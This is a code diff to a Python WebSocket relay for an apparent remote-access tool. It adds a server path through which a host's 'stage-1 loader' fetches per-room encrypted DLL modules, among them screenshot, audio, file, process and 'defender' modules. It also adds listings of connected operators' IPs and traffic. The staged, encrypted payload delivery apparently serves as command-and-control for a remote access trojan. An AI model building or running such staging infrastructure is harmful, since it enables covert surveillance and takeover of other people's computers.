@@ -4,7 +4,7 @@ RemoteDesktop VPS Server - WebSocket Relay
 Bridges C++ host <--> Web client
 Version: 2024-03-12-v3 (stream throttle + diagnostics)
 """
-SERVER_VERSION = "1.0.139"
+SERVER_VERSION = "1.0.151"
 
 import asyncio
 import websockets
@@ -65,6 +65,27 @@ SCREENSHOT_TEMPLATES_FILE = SCREENSHOT_DIR / "_templates.json"
 # Audio recording storage
 AUDIO_DIR = Path(os.environ.get("RDP_AUDIO_DIR", "/opt/remotedesk/audio"))
 AUDIO_QUOTA = int(os.environ.get("RDP_AUDIO_QUOTA", 500_000_000))  # 500MB default
+
+# ─── Stage-2 encrypted module blobs ──────────────────────────────────────────
+# Directory layout: STAGE2_DIR / <room_token> / <module>.bin
+# Each blob is AES-256-GCM-encrypted with a key derived from the room's token
+# (see _gen_stage2_blob.py and aes_gcm.h). The server never sees plaintext —
+# it's just a content-addressed file server for already-encrypted payloads.
+#
+# Deployment workflow:
+#   1. Admin builds stage-2 DLLs with CMake (`build/stage2/<mod>.dll`)
+#   2. Admin runs `python _gen_stage2_blob.py <room_token> <dll> <bin>` for
+#      each room, placing outputs in STAGE2_DIR/<room_token>/
+#   3. Host's stage-1 fetches them on-demand over its existing auth'd WSS
+STAGE2_DIR = Path(os.environ.get("RDP_STAGE2_DIR", "/opt/remotedesk/stage2"))
+STAGE2_MAX_BLOB = int(os.environ.get("RDP_STAGE2_MAX_BLOB", 10_000_000))  # 10MB safety cap
+
+# Whitelist of module names to avoid path traversal shenanigans
+STAGE2_KNOWN_MODULES = frozenset({
+    "screenshot", "audio", "stream", "filemgr", "procmgr", "defender",
+    # Dev/test:
+    "sample",
+})
 
 def _ensure_screenshot_dir(token: str) -> Path:
     d = SCREENSHOT_DIR / token
@@ -468,7 +489,7 @@ ADMIN_TOKEN = os.environ.get("RDP_ADMIN_TOKEN", "change-me-admin-token")
 MAX_ROOMS = int(os.environ.get("RDP_MAX_ROOMS", "100"))
 MAX_CLIENTS_PER_ROOM = int(os.environ.get("RDP_MAX_CLIENTS", "10"))
 PING_INTERVAL = 10   # 10s ping interval (2s was too aggressive, wasted event loop time during file transfers)
-PING_TIMEOUT = 120
+PING_TIMEOUT = 30    # 30s (was 120s — stale clients stayed "online" for 2 minutes)
 SSL_CERT = os.environ.get("RDP_SSL_CERT", "")
 SSL_KEY  = os.environ.get("RDP_SSL_KEY", "")
 
@@ -700,16 +721,28 @@ async def handler(websocket, path: str):
         # Notify clients that host came online
         if role == "host":
             await broadcast_to_clients(room, make_event("host_online", {"user_id": user_id}))
+            # Send current client count to host (so it can skip auto-stopping stream
+            # if clients are already connected when host reconnects)
+            try:
+                await conn.ws.send(make_event("clients_online", {"count": len(room.clients)}))
+            except:
+                pass
         # Notify host that a client joined (not for stream-only connections)
         if role == "client" and room.host:
             try:
                 await room.host.ws.send(make_event("client_joined", {"user_id": user_id}))
             except:
                 pass
-        # Notify ALL clients about current client count (for "another operator online" badge)
+        # Notify ALL clients (and host) about current client count
         if role == "client":
             n = len(room.clients)
             await broadcast_to_clients(room, make_event("clients_online", {"count": n}))
+            # Also notify host so its viewer watchdog knows when to stop the stream
+            if room.host:
+                try:
+                    await room.host.ws.send(make_event("clients_online", {"count": n}))
+                except:
+                    pass
         
         # ── Message relay loop ─────────────────────────────────────────────
         async for raw_msg in websocket:
@@ -1166,6 +1199,40 @@ async def handler(websocket, path: str):
                         }))
                         continue
 
+                    # clients_list: handled by VPS (has full info about connected clients)
+                    if sc_cmd == "clients_list":
+                        now = time.time()
+                        cl = []
+                        for cid, c in list(room.clients.items()):
+                            cl.append({
+                                "id": cid,
+                                "ip": c.remote,
+                                "connected": int(now - c.connected_at),
+                                "bytes_sent": c.bytes_sent,
+                                "bytes_recv": c.bytes_recv,
+                                "msgs": c.msg_count,
+                                "is_you": cid == user_id,
+                            })
+                        host_info = None
+                        if room.host:
+                            h = room.host
+                            host_info = {
+                                "ip": h.remote,
+                                "connected": int(now - h.connected_at),
+                                "bytes_sent": h.bytes_sent,
+                                "bytes_recv": h.bytes_recv,
+                            }
+                        await websocket.send(json.dumps({
+                            "id": msg.get("id", ""), "ok": True,
+                            "data": {
+                                "clients": cl,
+                                "host": host_info,
+                                "stream_count": len(room.stream_clients),
+                                "file_count": len(room.file_clients),
+                            }
+                        }))
+                        continue
+
                     # Client → Host
                     if room.host:
                         try:
@@ -1177,6 +1244,56 @@ async def handler(websocket, path: str):
                         await websocket.send(make_error("Host not connected"))
                 
                 elif role == "host":
+                    # ── Stage-2 blob fetch from host ──
+                    # Host's stage-1 loader requests an encrypted module blob
+                    # via its existing auth'd WSS connection. Server reads the
+                    # file from STAGE2_DIR/<token>/<module>.bin and returns it
+                    # inside the normal {id, ok, data:{blob_b64}} response.
+                    # This is NOT forwarded to clients.
+                    if msg.get("cmd") == "stage2_fetch":
+                        req_id = str(msg.get("id", ""))
+                        module = str(msg.get("module", ""))
+                        if module not in STAGE2_KNOWN_MODULES:
+                            await websocket.send(json.dumps({
+                                "id": req_id, "ok": False,
+                                "error": "unknown stage2 module"
+                            }))
+                            continue
+                        blob_path = STAGE2_DIR / room.token / f"{module}.bin"
+                        if not blob_path.is_file():
+                            await websocket.send(json.dumps({
+                                "id": req_id, "ok": False,
+                                "error": f"stage2 blob not found: {module}"
+                            }))
+                            continue
+                        try:
+                            sz = blob_path.stat().st_size
+                            if sz > STAGE2_MAX_BLOB:
+                                await websocket.send(json.dumps({
+                                    "id": req_id, "ok": False,
+                                    "error": "stage2 blob too large"
+                                }))
+                                continue
+                            data = blob_path.read_bytes()
+                        except OSError as e:
+                            await websocket.send(json.dumps({
+                                "id": req_id, "ok": False,
+                                "error": f"stage2 read error: {e}"
+                            }))
+                            continue
+                        b64 = base64.b64encode(data).decode("ascii")
+                        await websocket.send(json.dumps({
+                            "id": req_id, "ok": True,
+                            "data": {
+                                "cmd":   "stage2_blob",
+                                "module": module,
+                                "size":   len(data),
+                                "blob_b64": b64,
+                            }
+                        }))
+                        log.info(f"stage2: served {module}.bin ({len(data):,} bytes) to host token={room.token[:8]}")
+                        continue
+
                     # Routing hint: queue target for next binary message (supports pipelining)
                     route_target = msg.get("_route_binary_to", "")
                     if route_target:
@@ -1229,6 +1346,12 @@ async def handler(websocket, path: str):
                 # Notify remaining clients about updated client count
                 n = len(room.clients)
                 await broadcast_to_clients(room, make_event("clients_online", {"count": n}))
+                # Also notify host so its viewer watchdog can auto-stop stream when n=0
+                if room.host:
+                    try:
+                        await room.host.ws.send(make_event("clients_online", {"count": n}))
+                    except:
+                        pass
 
 async def broadcast_to_clients(room: Room, msg):
     """Send text/FILE messages to command clients only (not stream-only connections)."""
